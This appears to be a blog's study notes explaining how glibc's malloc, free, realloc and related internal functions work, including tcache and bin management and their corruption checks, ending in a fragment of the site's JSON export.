MALLOC/FREE\n__libc_malloc(size_t bytes)\nCHECKS MADE -\n\nChecks if the memory returned by __int_malloc() calls are proper\nFunctionality of code -\n\n\nIf __malloc_initialised is set to zero it calls ptmalloc_init() to initialise malloc. Else it proceeds and converts size to accomodate headers and to check if it is zero even after that. If yes it returns error.\nElse it continues with converting the size to a tcache index if tcache is uninitialised or bins are less than index it doesnt use tcache else it gets the chunk from the specified index if the value is greater than 0 by using tcache_get(index)\nIf single threaded it calls __int_malloc() which returns a ptr which is then memory tagged if tagging is enabled else it returns the pointer to the memory returned by __int_malloc()\nElse it tries to get the arena which it belongs to and then calls _int_malloc. if it fails then it retries with another usable arena by calling arena_get_retry() which either creates a new arena or looks for another one.\nIt returns after tagging the memory and asserting that either the returned memory belongs in the same arena as it claims or doesnt exist or is mmaped.\n\n__libc_free(void *mem)\nCHECKS PRESENT —\nFunctionality of the code —\n\nfree (0) just returns\nIf mtags are enabled then it checks the pointer given with the tag applied to it, useful against double-free().\nIt checks if the pointer given to is of an mmapped region separate from the normal malloc routine, checks upper and lower malloc threshold with the size and also checks if dynamic threshold (user defined) is enabled. If yes it updates the threshold to the chunksize and the trim threshold to twice the mmap threshold. After which the chunk is unmapped.\nElse It initialises tcache if not yet initialised, and tags memory if mtags enabled and gets the arena and calls  _int_free()\nIf none of the following occurs it sets error and returns\n\n__libc_realloc(void *oldmem, size_t bytes)\nCHECKS DONE —\n\nrealloc() has a wraparound check for the size field which checks if the value of size could be malicously crafted or misplaced.\nFunctionality of code —\n\n\nIf malloc is not initialised then it calls ptmalloc_init()\n\n\nif size is 0 it frees if the REALLOC_ZERO_BYTE_FREES macro is active else realloc of null gives same results as malloc of null\n\n\nmtag checks are done if mtag is enabled.\n\n\nIf the size requested is fullfilled by the alignment padding then the same pointer is returned as such.\n\n\nIf the chunk is mmapped then it sets arenaptr to NULL else if tcache is not initialised it initializes tcache. and sets ar_ptr to arena_for_chunk. If chunk is mmapped or after headers the size field is 0 it exits.\nIf chunk was mmaped it uses mremap to remap the current chunk and tags the memory again with a different tag. Else if remap is not enabled then it uses a malloc call to allocate space. If memory is returned then it returns memory after unmapping previous chunk and copying content.\nIf the process is single threaded then it calls _int_realloc() and asserts the returned pointer either is NULL or is mmapped or is ar_ptr is arena_for_chunk() If memory is failed to be obtained in one arena it checks or allocates memory through other arenas and returns a pointer to memory.\n\n_mid_memalign(size_t alignment, size_t bytes, void *addr)\nFunctionality of the code —\n\n__libc_malloc() is called if alignment is less or equal to malloc_alignment. Else it ensures it is a minimum chunk size. If the alignment is greater than SIZE_MAX /2 + 1 it can cause an overflow thus it sets error and exits.\nIt checks if alignment is a power of two.\nIf tcache is enabled gets tcache alongside checking all instances of pointers within the tcache is aligned. If tagging of memory is present then tagging is done and the pointer is returned. If no tcache mem or no tcache then does next.\nIf it is single threaded process it just calls _int_memalign() If the arena does not have enough space then it tries to get a new arena and then returns the tagged memory after finding the arena for chunk.\n\n__libc_valloc (size_t bytes)\nFunctionality of the code —\nSame functionality as malloc() but the memory returned by calls to valloc are page-aligned memory. It just calls mid_memalign but with pagesize argument. Same with libc_pvalloc() but it has an overflow check in the rounded_bytes given by pagesize\n__libc_calloc (size_t n, size_t elem_size)\nFunctionality of the code —\n\nChecks if the malloc_initialised flag is set, if not initialise malloc.  If tcache remains unitiated initiate tcache. If it is a single threaded process then it sets av as mainarena and then if av exists,\nMorecore clears flag is set then it gives by cutting from topsize. This means the normal morecore routine zeros memory if its greater than Minsize then the memory newly allocated is sure to be clear.\nWhile using mtags the whole memory is zeroed out irrespective of the morecore_clears flag. If the memory is not freshly sbrked then only the clearing happens.\n\nCORE FUNCTIONS\n_int_malloc (mstate av, size_t bytes)\nThe functionality of the code —\n\nConverts the requested size by padding it with the overhead size and checking with checked_request2size which checks for requests that wraps around 0.\nChecks for if any usable arenas exist &gt;&gt;\n\nIf yes it continues\nElse it calls sysmalloc instead with null which then sets up a region of memory, The arena checks were done previously in outer libc functions thus the following call is made directly without checking\n\n\nCHECK IF SIZE QUALIFIES AS FASTBIN —\n\nChecks if the memory within fastbin is greater than the chunk\nChecks if there is an available fastbin pointer in the index\n\nChecks if it is aligned if yes proceeds else calls error align fastbin\nChecks if chunksize belongs in fastbin if failed calls mem corruption:fastbin\nelse calls check_remalloced_chunk\n\n\nIf encountered other chunks of same size puts them into tcache if tcache_enabled. During this another fastbin check is present which checks for alignment of fastbins.\nAfter putting them in the tcache we return the pointer to the memory and return from the function. if perturb byte present does memset .\n\n\nCHECK IF THE SIZE QUALIFIES IN THE RANGE OF A SMALL BIN\n\nDoes the backward to forward check but not forward to back\nIf the av not main arena then sets non main arena bit\ntcache stashing occurs same as in fastbins and is unlinked from smallbins\nThe function returns the pointer finally which is of the requested size\n\n\nCHECK IF THE SIZE QUALIFIES IN THE RANGE OF A LARGE BIN\n\nWhen a large request is called it calls malloc_consolidate to free up fast bins and make memory available.\nSets the index to a large bin index, sets the tc_idx to a tcache index\n\n\nDoes an infinite loop\n\nCASE 1\n\n\nStarts looking at unsorted bins to satisfy request.\nMultiple checks are made to check for memory corruption\nChecks if it is the only unsorted chunk and if yes checks for the last remainder if the chunk was the last remainder then if the current size is satisfied the chunk is alloted and pointer is returned\n\n\nCASE 2\n\n\nIf the first fails it tries to fill tcache if it is best fit.\nIf tcache is full then it tries to return if it is exact fit\nGoes for smallbin first\n\nplaces the chunk in the bin\n\n\nGoes for largebin next\n\nplaces the chunk in sorted order\nHas the forward and backward ptr check alongside the _nextsize field check\n\n\nIf the tcache processing is complete it returns the tcached chunk at the index\nIf iteration exceeds 10000 it breaks\nIf all the small chunks found ended up cached return one\nIf it is a large request scan through the chunks of the current bin in sorted order to find the smallest that fits , uses a skiplist\nFinally it puts the remaining size after allocation into the unsorted bins\n\n\nLOOKS THROUGH THE BINMAP\n\nIf a proper chunk is obtained same procedure occurs\n\n\nSEES IF TOP CHUNK IS ENOUGH\n\nIf top chunk can satisfy the request the chunk is cut out and allocation is given\n\n\nCALLS SYSMALLOC IF NOTHING WORKS TO ALLOCATE THROUGH SYSTEM\n\n\n_int_free (mstate av, mchunkptr p,int have_lock)\nThe functionality of the code —\n\nChecks if the given pointer is misaligned or if the size is less than minsize, if failed exits else checks the inuse chunk.\nTCACHE DUMPING —\n\nIf tcache is enabled then it checks to see if its already in the tcache if yes it detects a double free.\nIf tcache count is greater than tcache_count var it states too many chunks and exits.\nIt also checks alignment and exits if unaligned.\nIf tcache putting worked then it returns\n\n\nFASTBIN FORWARDING —\n\nAgain checks are made but it checks the top of fastbin alone to check if a double free occured in single thread, thus making bypass easy.\nIn multi thread it checks all of the fastbins for a double free\nThen it gets a lock for it to add it to fastbin if it has a lock\n\n\nUNSORTED BIN THROWAWAY —\n\nChecks for double free corruption top , chunk boundary check , inuse check, invalid next size etc\nIt tries to consolidate backward if previze is not same as chunksize it states corrupted prev size and exits\nIt tries forward coalescing afterwards and unlinks the chunk and clears inuse bit.\nThe following chunk is thrown into the unsorted bins and then check_free_chunk is called.\nIf chunk borders top the chunk merges with the top\n\n\nOTHERS\n\nIt calls malloc_consolidate() if the fastbin_consolidation_threshold is met. and if av is main arena it tries systrim() if trim threshold is met.\nAlso tries heap_trim even if the top chunk is not large\nIf chunk was allocated due to mmap it does a munmap_chunk() call which unmaps the chunk.\n\n\n\nmalloc_consolidate(mstate av)\nChecks —\n\nfastbin alignment check\nchunk size check\nduring consolidation : prev_size check\nThe functionality of the code —\n\n\nREMOVAL INTO UNSORTED BINS —\n\nIt removes each chunk from the fastbin into an unsorted bin so that only during requirements will the sorting into actual bins happen.\nAfter putting a fastbin chunk into an unsorted bin it does a consolidation of the fastbins\nIf a fastbin chunk borders top chunk it merges down with the top chunk\n\n\n\n_int_realloc(mstate av,mchunkptr oldp,SIZE_T oldsize,SIZE_T nb)\nCHECKS MADE —\n\nSize check for next size, caller is filtered for mmapped chunks thus an assertion is made that the chunk is not mmapped.\nA check for size on old size on if it is valid.\n\nFunctionality of the code —\n\nIf it is already big enough it checks with the top chunk and coalesces down if next chunk is top chunk.\nIf next chunk is not top chunk then it tries to expand forward into next chunk if it is free and the next is a remainder\nIf nothing above works it allocates using _int_malloc\n\nIt does a copy if the newp obtained through malloc is not the very next chunk\nAnd it if it is the next chunk it extends the size and returns the given pointer itself.\n\n\nIf possible it tries to free extra space from the previous chunk and marks remainder as inuse so that free doesnt complain and then calls free on the remainder memory which can then put it into unsorted bins.\nIf memory tagging is there it returns tagged memory else untagged\nFinally the function returns\n"},"STACK-BASED-EXPLOITATION":{"title":"STACK-BASED-EXPLOITATION","links":[],"tags":["blog"],"content":""}}